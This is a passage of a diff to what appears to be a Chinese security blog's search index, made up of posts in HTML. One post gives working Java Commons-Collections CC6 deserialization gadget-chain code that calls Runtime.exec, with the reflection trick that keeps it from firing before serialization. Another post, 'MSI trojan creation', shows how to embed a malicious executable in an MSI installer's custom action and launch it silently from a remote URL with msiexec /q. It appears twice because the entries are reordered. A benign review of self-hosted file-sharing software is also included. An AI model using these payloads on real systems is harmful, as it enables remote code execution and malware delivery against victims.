(InvocationHandler)constructor.newInstance(Override.class,lazymap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapproxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">        map.getClass().getClassLoader(),</span><br><span class="line">        map.getClass().getInterfaces(),</span><br><span class="line">        annotationInvocationhandler);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapproxy);</span><br><span class="line"></span><br><span class="line">Serialize(obj);</span><br><span class="line"><span class="type">Object</span> <span class="variable">objecj</span> <span class="operator">=</span> Unserialize(<span class="string">&quot;test.ser&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230323154644608.png" alt="image-20230323154644608"></p>
+<h1 id="CC6链">CC6链</h1>
+<p>之前的实验一直都是在jdk为8u65的环境下进行的,这是因为Oracle在<code>jdk8u71</code>版本就修改了AnnotationInvocationHandler的readObject方法,不再直接调用memberValues,导致之前的整条链全都行不通了</p>
+<p>所以我们要找一条所有jdk版本都可以使用的利用链</p>
+<p>之前我们在学URLDNS的时候利用到了HashMap里的readObject方法,这个方法会最终调用key的hashcode方法,而正好有一个TiedMapEntry类中带有hashcode方法,同时这个方法又调用了自己的getValue方法,进而调用了get方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是命令执行代码构造如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;13&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure>
+<p>但执行的时候会发现直接就调出了计算器,说明整条链还没序列化就跑完了,原理和URLDNS类似,在HashMap的put方法中,已经调用了hashcode方法,所以我们得通过反射来解决这个问题</p>
+<p><img src="image-20230323170709111.png" alt="image-20230323170709111"></p>
+<p>在put前,我们要让整条链先断开,put完了以后再连上</p>
+<p>这里我们选择断开TiedMapEntry到LazyMap的这条链,将tiedMapEntry对象的实例化代码修改为</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);<span class="comment">//传入map而不是lazymap</span></span><br></pre></td></tr></table></figure>
+<p>put完了以后在通过反射修改tiedMapEntry对象的map属性值</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br></pre></td></tr></table></figure>
+<p>所以整个命令执行代码修改为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//断开利用链</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;13&quot;</span>);</span><br><span class="line"><span class="comment">//TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&quot;13&quot;);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射恢复利用链</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">mapfield.set(tiedMapEntry,lazymap);</span><br><span class="line">Test.Serialize(hashMap);</span><br></pre></td></tr></table></figure>
+<p>反序列化命令执行成功！！！</p>
+<p><img src="image-20230323173008338.png" alt="image-20230323173008338"></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>linux双重释放漏洞</title>
     <url>/post/linux%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>最近刚好一个项目涉及到了double free漏洞，于是有了本篇学习记录。</p>
@@ -1061,136 +1061,6 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msi木马创建</title>
-    <url>/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/</url>
-    <content><![CDATA[<h1 id="MSI文件">MSI文件</h1>
-<p><code>MSI 文件</code>指的是 <code>Windows Installer Package </code>文件，它是一种用于安装、升级、修复和卸载软件的安装程序包格式。</p>
-<p>Windows Installer 是 Microsoft Windows 操作系统中的一种安装技术，用于管理和执行软件的安装和卸载过程。MSI 文件是 Windows Installer 技术的核心组成部分，它以.msi 文件扩展名来标识。</p>
-<p>MSI 文件是一种数据库式文件，其中包含了安装程序所需的文件、注册表项、配置信息、脚本和其他相关组件。它提供了一种标准化的方式来描述和定义软件的安装过程，使得软件的安装和管理更加可靠和可预测。</p>
-<p>通过运行 MSI 文件，Windows Installer 将打开一个安装向导，引导用户完成软件的安装过程。安装过程中，Windows Installer 会根据 MSI 文件中的指令和设置，将文件复制到适当的位置，注册组件、创建快捷方式，执行系统配置等操作，最终将软件成功安装到目标计算机上。</p>
-<p>MSI 文件具有一些特性，如安装过程的事务性、修复和升级功能、卸载功能、自定义操作等。它们被广泛用于 Windows 系统中的软件安装，包括应用程序、驱动程序、插件和组件等。</p>
-<p>需要注意的是，运行 MSI 文件通常需要管理员权限或适当的安装权限，以确保安装过程能够成功地对系统进行更改和配置。</p>
-<p>常见的msi:</p>
-<p><img src="image-20230831230437851.png" alt="image-20230831230437851"></p>
-<h1 id="木马制作思路">木马制作思路</h1>
-<p>在MSI软件包中，<code>制作者可以使用自定义操作（Custom Actions）来执行特定的任务</code>，例如运行可执行文件、执行脚本、修改注册表等。当执行安装过程时，MSI软件包会按照事先定义的规则和流程执行这些自定义操作。如果将恶意的exe（也可以是dll、js和vbs）文件作为msi安装过程中要运行的文件，将直接触发恶意代码。</p>
-<p><code>msiexec</code>是Windows操作系统中的命令行实用程序，用于处理MSI（Microsoft Installer）文件。它是Microsoft Installer的执行引擎，负责解析和执行MSI文件中定义的安装、修复、更新和卸载操作。msiexec支持<code>远程加载</code>msi文件并安装。</p>
-<p>相当于通过msiexec间接运行我们的恶意exe，整个过程无文件落地。</p>
-<h1 id="创建msi文件">创建msi文件</h1>
-<p>msi文件可以通过<a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">Advanced Installer</a><a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">1</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">，Discover</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">2</a>，或者Visual Studio等方式创建，这里我们以Visual Studio 2022为例。</p>
-<h2 id="下载安装插件">下载安装插件</h2>
-<p>首先要下载安装<code>Visual Studio Installer Projects</code>插件，在vs中点击左上角<code>拓展</code>—&gt;<code>管理拓展</code>，直接搜索下载安装</p>
-<p><img src="image-20230831232418630.png" alt="image-20230831232418630"></p>
-<p>这样可能会比较慢，也可以直接下载<a href="https://marketplace.visualstudio.com/items?itemName=VisualStudioClient.MicrosoftVisualStudio2022InstallerProjects">拓展包</a>安装。</p>
-<h2 id="添加Setup-Project项目">添加Setup Project项目</h2>
-<p>创建一个新的<code>Setup Project</code>项目</p>
-<p><img src="image-20230831232701251.png" alt="image-20230831232701251"></p>
-<p>添加<code>项目输出</code></p>
-<p><img src="image-20230831232813669.png" alt="image-20230831232813669"></p>
-<p>选择<code>主输出</code></p>
-<p><img src="image-20230831232832022.png" alt="image-20230831232832022"></p>
-<blockquote>
-<p>可能会遇到项目输出是空的情况，应该是解决方案配置的问题，建议不要创建一个Setup Project项目的解决方案，而是在已有解决方案项目的情况下添加Setup Project项目</p>
-<p><img src="image-20230831234805675.png" alt="image-20230831234805675"></p>
-</blockquote>
-<h2 id="添加恶意exe">添加恶意exe</h2>
-<p>右键项目选择<code>自定义操作</code></p>
-<p><img src="image-20230831232942395.png" alt="image-20230831232942395"></p>
-<p>发现有四个操作分别为<code>&quot;安装&quot;、&quot;提交&quot;、&quot;回滚&quot;和&quot;卸载&quot;</code></p>
-<p><img src="image-20230831233023014.png" alt="image-20230831233023014"></p>
-<p>在安装程序中，“安装”、“提交”、&quot;回滚&quot;和&quot;卸载&quot;是四个常见的操作类型，它们用于描述不同的安装过程中的行为和阶段。</p>
-<ol>
-<li>安装（Install）：安装操作是指将应用程序或软件包安装到目标计算机上的过程。在安装操作中，文件、注册表项、服务、组件等将被复制、配置和注册到目标计算机的适当位置。通常，安装操作会创建所需的目录结构、注册必要的组件，并执行其他必要的配置任务。</li>
-<li>提交（Commit）：提交操作是指在安装过程中，当所有的文件和配置都已成功复制和注册到目标计算机时，确认将更改应用到系统的阶段。在提交操作之前，所有的安装操作都被视为临时性的。提交操作会将安装所做的更改永久性地应用到系统中，以确保应用程序的完整性和可用性。</li>
-<li>回滚（Rollback）：回滚操作是指当安装过程中发生错误或遇到问题时，将安装过程还原到初始状态的过程。如果在安装过程中出现错误，安装程序可以回滚（撤销）之前的所有操作，以恢复目标计算机到安装前的状态，以避免对系统造成不可逆的更改。</li>
-<li>卸载（Uninstall）：卸载操作是指从目标计算机中完全移除已安装的应用程序或软件包的过程。在卸载操作中，与安装过程相反，文件、注册表项、服务等与应用程序相关的组件将被删除，以及执行其他必要的清理任务。</li>
-</ol>
-<p>我们选择”安装“，右键添加自定义操作</p>
-<p>Add File可以添加具体的运行文件，这里以一个简单的弹框exe模拟恶意脚本</p>
-<p><img src="image-20230831233355250.png" alt="image-20230831233355250"></p>
-<p>点击OK则成功添加到”安装“操作中</p>
-<p><img src="image-20230831233542197.png" alt="image-20230831233542197"></p>
-<p>点击重新生成将生成两个文件，msi文件就是我们嵌入了恶意exe的目标文件</p>
-<p><img src="image-20230831233711946.png" alt="image-20230831233711946"></p>
-<h1 id="利用">利用</h1>
-<p>先用python起一个临时服务器，然后再目标主机上运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msiexec /i msi文件的url地址 /q TARGETDIR=&quot;C:/Users/Public/Documents&quot;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>/i</code> 是 msiexec 命令的参数，表示执行安装操作。</li>
-<li><code>/q</code> 是 msiexec 命令的参数，表示以安静（静默）模式执行安装，即在不显示任何用户界面的情况下执行安装过程。</li>
-<li>TARGETDIR指定程序的安装位置，不指定的话则默认安装到Program Files下，则会有权限不够以及UAC的情况</li>
-</ul>
-<p>发现恶意exe被执行（messagebox.exe的功能就是弹出一个niupi）</p>
-<p><img src="image-20230831234223966.png" alt="image-20230831234223966"></p>
-<p>参考：</p>
-<p><a href="https://blog.csdn.net/syzcyyx/article/details/129482721">使用VisualStudio2022插件(Visual Studio Installer Projects 2022)打包 .Net 6 框架下的 WPF项目 为安装文件</a></p>
-<p><a href="https://blog.csdn.net/weixin_44790046/article/details/103016154">VS2019打包生成安装文件图文详细教程</a></p>
-<p><a href="https://blog.csdn.net/wmonica121/article/details/13503791">vs2010打包程序   项目输出组为空</a></p>
-<p><a href="https://www.c-sharpcorner.com/article/how-to-perform-custom-actions-and-upgrade-using-visual-studio-installer/">如何使用 Visual Studio 安装程序执行自定义操作和升级 (c-sharpcorner.com)</a></p>
-<p><a href="https://www.red-gate.com/simple-talk/development/dotnet-development/visual-studio-setup-projects-and-custom-actions/">Visual Studio 设置 - 项目和自定义操作 - 简单对话 (red-gate.com)</a></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>木马</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>seafile和alist使用体验</title>
-    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong><br>
-<img src="ab1a82c6bfabc1191ebdb4b0574351e2.jpeg" alt="ab1a82c6bfabc1191ebdb4b0574351e2.jpeg"></p>
-<h3 id="seafile">seafile</h3>
-<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
-<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
-<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
-<p>优点：</p>
-<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
-<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
-<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
-<p>缺点：</p>
-<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
-<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
-<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
-<p><img src="3332e0ca17ddc316dff9dfce8e855a7b.png" alt="3332e0ca17ddc316dff9dfce8e855a7b.png"></p>
-<h3 id="alist">alist</h3>
-<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
-<p>alist的部署更加简单，具体可以看这位博主的文章</p>
-<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
-<p>同样讲一下alist的优缺点</p>
-<p>优点：</p>
-<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
-<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
-<p>缺点：</p>
-<p>​    1.没有客户端工具只能通过网页端访问资源</p>
-<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
-<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
-<p>​    4.有点“重”，内容多的话要加载很久</p>
-<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
-<h3 id="alist的安全问题">alist的安全问题</h3>
-<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
-<p><img src="d084b60e129e0b01c6c9ff098f0ef590.png" alt="d084b60e129e0b01c6c9ff098f0ef590.png"></p>
-<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
-<p><img src="5fb6ece552d92978ae906da09115795a.png" alt="5fb6ece552d92978ae906da09115795a.png"></p>
-<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
-<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
-<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
-<p>同时也可以参考下面这位up主的视频</p>
-<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
-<h3 id="最后">最后</h3>
-<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
-]]></content>
-      <categories>
-        <category>使用体验</category>
-      </categories>
-      <tags>
-        <tag>alist</tag>
-        <tag>seafile</tag>
       </tags>
   </entry>
   <entry>
@@ -1348,6 +1218,136 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msi木马创建</title>
+    <url>/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/</url>
+    <content><![CDATA[<h1 id="MSI文件">MSI文件</h1>
+<p><code>MSI 文件</code>指的是 <code>Windows Installer Package </code>文件，它是一种用于安装、升级、修复和卸载软件的安装程序包格式。</p>
+<p>Windows Installer 是 Microsoft Windows 操作系统中的一种安装技术，用于管理和执行软件的安装和卸载过程。MSI 文件是 Windows Installer 技术的核心组成部分，它以.msi 文件扩展名来标识。</p>
+<p>MSI 文件是一种数据库式文件，其中包含了安装程序所需的文件、注册表项、配置信息、脚本和其他相关组件。它提供了一种标准化的方式来描述和定义软件的安装过程，使得软件的安装和管理更加可靠和可预测。</p>
+<p>通过运行 MSI 文件，Windows Installer 将打开一个安装向导，引导用户完成软件的安装过程。安装过程中，Windows Installer 会根据 MSI 文件中的指令和设置，将文件复制到适当的位置，注册组件、创建快捷方式，执行系统配置等操作，最终将软件成功安装到目标计算机上。</p>
+<p>MSI 文件具有一些特性，如安装过程的事务性、修复和升级功能、卸载功能、自定义操作等。它们被广泛用于 Windows 系统中的软件安装，包括应用程序、驱动程序、插件和组件等。</p>
+<p>需要注意的是，运行 MSI 文件通常需要管理员权限或适当的安装权限，以确保安装过程能够成功地对系统进行更改和配置。</p>
+<p>常见的msi:</p>
+<p><img src="image-20230831230437851.png" alt="image-20230831230437851"></p>
+<h1 id="木马制作思路">木马制作思路</h1>
+<p>在MSI软件包中，<code>制作者可以使用自定义操作（Custom Actions）来执行特定的任务</code>，例如运行可执行文件、执行脚本、修改注册表等。当执行安装过程时，MSI软件包会按照事先定义的规则和流程执行这些自定义操作。如果将恶意的exe（也可以是dll、js和vbs）文件作为msi安装过程中要运行的文件，将直接触发恶意代码。</p>
+<p><code>msiexec</code>是Windows操作系统中的命令行实用程序，用于处理MSI（Microsoft Installer）文件。它是Microsoft Installer的执行引擎，负责解析和执行MSI文件中定义的安装、修复、更新和卸载操作。msiexec支持<code>远程加载</code>msi文件并安装。</p>
+<p>相当于通过msiexec间接运行我们的恶意exe，整个过程无文件落地。</p>
+<h1 id="创建msi文件">创建msi文件</h1>
+<p>msi文件可以通过<a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">Advanced Installer</a><a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">1</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">，Discover</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">2</a>，或者Visual Studio等方式创建，这里我们以Visual Studio 2022为例。</p>
+<h2 id="下载安装插件">下载安装插件</h2>
+<p>首先要下载安装<code>Visual Studio Installer Projects</code>插件，在vs中点击左上角<code>拓展</code>—&gt;<code>管理拓展</code>，直接搜索下载安装</p>
+<p><img src="image-20230831232418630.png" alt="image-20230831232418630"></p>
+<p>这样可能会比较慢，也可以直接下载<a href="https://marketplace.visualstudio.com/items?itemName=VisualStudioClient.MicrosoftVisualStudio2022InstallerProjects">拓展包</a>安装。</p>
+<h2 id="添加Setup-Project项目">添加Setup Project项目</h2>
+<p>创建一个新的<code>Setup Project</code>项目</p>
+<p><img src="image-20230831232701251.png" alt="image-20230831232701251"></p>
+<p>添加<code>项目输出</code></p>
+<p><img src="image-20230831232813669.png" alt="image-20230831232813669"></p>
+<p>选择<code>主输出</code></p>
+<p><img src="image-20230831232832022.png" alt="image-20230831232832022"></p>
+<blockquote>
+<p>可能会遇到项目输出是空的情况，应该是解决方案配置的问题，建议不要创建一个Setup Project项目的解决方案，而是在已有解决方案项目的情况下添加Setup Project项目</p>
+<p><img src="image-20230831234805675.png" alt="image-20230831234805675"></p>
+</blockquote>
+<h2 id="添加恶意exe">添加恶意exe</h2>
+<p>右键项目选择<code>自定义操作</code></p>
+<p><img src="image-20230831232942395.png" alt="image-20230831232942395"></p>
+<p>发现有四个操作分别为<code>&quot;安装&quot;、&quot;提交&quot;、&quot;回滚&quot;和&quot;卸载&quot;</code></p>
+<p><img src="image-20230831233023014.png" alt="image-20230831233023014"></p>
+<p>在安装程序中，“安装”、“提交”、&quot;回滚&quot;和&quot;卸载&quot;是四个常见的操作类型，它们用于描述不同的安装过程中的行为和阶段。</p>
+<ol>
+<li>安装（Install）：安装操作是指将应用程序或软件包安装到目标计算机上的过程。在安装操作中，文件、注册表项、服务、组件等将被复制、配置和注册到目标计算机的适当位置。通常，安装操作会创建所需的目录结构、注册必要的组件，并执行其他必要的配置任务。</li>
+<li>提交（Commit）：提交操作是指在安装过程中，当所有的文件和配置都已成功复制和注册到目标计算机时，确认将更改应用到系统的阶段。在提交操作之前，所有的安装操作都被视为临时性的。提交操作会将安装所做的更改永久性地应用到系统中，以确保应用程序的完整性和可用性。</li>
+<li>回滚（Rollback）：回滚操作是指当安装过程中发生错误或遇到问题时，将安装过程还原到初始状态的过程。如果在安装过程中出现错误，安装程序可以回滚（撤销）之前的所有操作，以恢复目标计算机到安装前的状态，以避免对系统造成不可逆的更改。</li>
+<li>卸载（Uninstall）：卸载操作是指从目标计算机中完全移除已安装的应用程序或软件包的过程。在卸载操作中，与安装过程相反，文件、注册表项、服务等与应用程序相关的组件将被删除，以及执行其他必要的清理任务。</li>
+</ol>
+<p>我们选择”安装“，右键添加自定义操作</p>
+<p>Add File可以添加具体的运行文件，这里以一个简单的弹框exe模拟恶意脚本</p>
+<p><img src="image-20230831233355250.png" alt="image-20230831233355250"></p>
+<p>点击OK则成功添加到”安装“操作中</p>
+<p><img src="image-20230831233542197.png" alt="image-20230831233542197"></p>
+<p>点击重新生成将生成两个文件，msi文件就是我们嵌入了恶意exe的目标文件</p>
+<p><img src="image-20230831233711946.png" alt="image-20230831233711946"></p>
+<h1 id="利用">利用</h1>
+<p>先用python起一个临时服务器，然后再目标主机上运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msiexec /i msi文件的url地址 /q TARGETDIR=&quot;C:/Users/Public/Documents&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>/i</code> 是 msiexec 命令的参数，表示执行安装操作。</li>
+<li><code>/q</code> 是 msiexec 命令的参数，表示以安静（静默）模式执行安装，即在不显示任何用户界面的情况下执行安装过程。</li>
+<li>TARGETDIR指定程序的安装位置，不指定的话则默认安装到Program Files下，则会有权限不够以及UAC的情况</li>
+</ul>
+<p>发现恶意exe被执行（messagebox.exe的功能就是弹出一个niupi）</p>
+<p><img src="image-20230831234223966.png" alt="image-20230831234223966"></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/syzcyyx/article/details/129482721">使用VisualStudio2022插件(Visual Studio Installer Projects 2022)打包 .Net 6 框架下的 WPF项目 为安装文件</a></p>
+<p><a href="https://blog.csdn.net/weixin_44790046/article/details/103016154">VS2019打包生成安装文件图文详细教程</a></p>
+<p><a href="https://blog.csdn.net/wmonica121/article/details/13503791">vs2010打包程序   项目输出组为空</a></p>
+<p><a href="https://www.c-sharpcorner.com/article/how-to-perform-custom-actions-and-upgrade-using-visual-studio-installer/">如何使用 Visual Studio 安装程序执行自定义操作和升级 (c-sharpcorner.com)</a></p>
+<p><a href="https://www.red-gate.com/simple-talk/development/dotnet-development/visual-studio-setup-projects-and-custom-actions/">Visual Studio 设置 - 项目和自定义操作 - 简单对话 (red-gate.com)</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>seafile和alist使用体验</title>
+    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
